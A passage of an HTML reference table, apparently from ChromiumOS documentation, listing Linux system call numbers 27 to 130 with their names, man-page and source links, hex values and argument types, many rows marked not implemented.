addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">28</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">29</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1e</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">31</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1f</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">32</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x20</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">33</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x21</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>nice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nice">cs/</a></td><td align="center">0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x23</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">36</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x25</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x26</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x27</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x28</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x2a</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x2b</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x2c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">45</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x2e</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x30</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">49</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x33</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">53</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x35</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">54</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">55</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x38</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">57</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x3a</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">59</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x3b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">60</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x3d</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x3e</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td align="center">0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaction">cs/</a></td><td align="center">0x43</td><td>int</td><td>const struct old_sigaction *</td><td>struct old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x44</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">69</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x45</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">70</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x46</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">71</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x47</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigsuspend">cs/</a></td><td align="center">0x48</td><td>int unused1</td><td>int unused2</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigpending">cs/</a></td><td align="center">0x49</td><td>old_sigset_t *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0x4a</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0x4b</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x4c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">77</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x4d</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x4e</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0x4f</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x50</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x51</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x52</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">83</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x53</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x54</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">85</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x55</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x56</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0x57</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x59</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">90</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x5a</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">91</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x5c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5e</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5f</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x62</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">99</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x63</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x64</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x65</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">102</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x66</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x68</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x69</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x6a</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x6b</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x6c</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x6d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">110</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x6e</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">111</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x70</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">113</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x71</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">114</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x72</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0x73</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x74</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x75</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">118</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigreturn">cs/</a></td><td align="center">0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">120</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x78</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">121</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0x79</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x7a</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x7b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">124</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x7c</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigprocmask">cs/</a></td><td align="center">0x7e</td><td>int how</td><td>old_sigset_t *set</td><td>old_sigset_t *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x7f</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">128</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x80</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x81</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td><em>not implemented</em></td><td align="center"></td><td 